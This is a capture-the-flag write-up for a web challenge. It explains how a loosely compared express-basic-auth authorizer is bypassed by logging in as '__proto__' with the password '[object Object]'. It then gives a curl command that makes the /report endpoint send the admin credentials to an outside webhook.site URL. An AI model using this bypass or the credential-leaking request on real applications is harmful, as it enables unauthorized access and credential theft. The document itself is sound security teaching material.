# username:password@

This is a web challenge, which also gives us access to source code and Dockerfile, which is really useful and should give us the solution to the challenge upon inspecting the code

## The first pitfall
When doing this challenge first thing I did was to investigate the libraries used to see if I could find any weakness in them. 
First thing that I noticed was the use of a library called express-basic-auth

When searching for this, you may find that this library had it's last commit in 2021, and it's likely deprecated, noy only that there is a vulnerability related to it.

https://security.snyk.io/vuln/SNYK-JS-EXPRESSBASICAUTH-174345

Sadly, it has been patched since 1.1.7

```js
{
  "dependencies": {
    "express": "^4.21.2",
    "express-basic-auth": "^1.2.1",
    "node-fetch": "^2.7.0"
  }
}
```

But, if we read the details in snyk, this is a timing attack vulnerability CWE-208, also, if we read the github repo it clearly states to use the safe function safeComparte in favor of javascript's comparison

![alt text](./Pasted%20image%2020250223005100.png) 

If we read at the loginRequired function on the code, we can see that it does exactly as this

```js
const loginRequired = basicAuth({
  authorizer: (username, password) => users[username] == password,
  unauthorizedResponse: 'Unauthorized',
});
```

So, problem solved, right?
I thought so, but after putting together a quick python script to test the password. (16 hexadecimal values generated randomly)
 
```js
const genRanHex = size =>
  [...Array(size)].map(() => Math.floor(Math.random() * 16).toString(16)).join('');

const users = {
  'admin': genRanHex(16),
};

```

I realized that the time between requests was pretty much the same, probably due to the network overhead making significant noise for this kind of attack

## What now?
I had my doubt's on this method, mostly due to the network overhead but the solution seemed as clear as water, specially thanks to the code doing exactly what the library maintainer advised against

When reviewing once more the loginRequired middleware we can see that it has a loose type comparison, which means that JS will not check for a strict comparison, i.e. Will compare values with different types by converting the operands 
For instance

```js
true=="1"
true
```

This is due to true being converted into a number, 1 and then converted into string so it can be compared to "1".  An extra step is taken with objects, as they are converted into primitives before the comparison

With this, we can try to bypass the loginRequired function. Looking at the code there are two endpoints using this middleware

```js
app.get('/report', loginRequired, (req, res) => {
  const path = req.query.path;

  if (!path) {
    return res.send("<form method='GET'>http://<input name='path' /><button>Submit</button></form>");
  }

  fetch(`https://admin:${users["admin"]}@${path}`)
    .then(() => res.send("Success"))
    .catch(() => res.send("Error"));
});

app.get('/admin', loginRequired, adminOnly, (req, res) => {
  res.send(flag);
});

```

The report endpoint, which makes a request on behalf of the admin, and the admin endpoint that fetches the flag, given the fact that the admin endpoint requires extra validation for the admin user, and report already makes a request in behalf of the admin user, we'll focus on getting to the report endpoint

## Bypassing the authorization

The login required function accesses the property key given as the username to see if the value stored in the users object is in fact, the password

This allows us to access the object prototype, while we cannot make prototype pollution because there is no assignment in the code, we can still make a comparison against it

### The object prototype
JS has a feature where all objects inherit from the same base prototype by default, and included in the prototype chain. Prototypes are like blueprints, providing common properties and functions, while objects hold properties of their own.

![alt text](./Pasted%20image%2020250223170444.png) 


In this example we create a dog object from the animal object, we can see that despite not having a function toString, it inherits it from the object prototype, at the top of the prototype chain

![alt text](./Pasted%20image%2020250223170652.png) 


We have to ways to access the object prototype

dot notation
	object.\_\_proto\_\_
bracket notation
	object\[".\_\_proto\_\_"\]
	

With this we can craft the payload

```js
users["__proto__"]=="[object Object]"
true
```

As the conversion to string for the object prototype is the \[object Object\] string

##### A quick note
When trying this payload you should use curl, as modern web browser have disabled by default the use of basic html authentication

You should also url encode the brackets
``` bash
curl http://__proto__:%5Bobject%20Object%5D@host1.dreamhack.games:16001/report

<form method='GET'>http://<input name='path' /><button>Submit</button></form>

```

### CSRF
With the authentication bypassed, we can steal the admin credentials by sending a request to a server controlled by us 

``` bash
curl http://__proto__:%5Bobject%20Object%5D@host1.dreamhack.games:16001/report?path=webhook.site/fab3b4a5-1db1-459b-91cf-c758a3d7b0de

```

With that we are able to get the admin credentials and steal the password
![alt text](./Pasted%20image%2020250223183805.png) 


And fetch the flag

![alt text](./Pasted%20image%2020250223183923.png) 
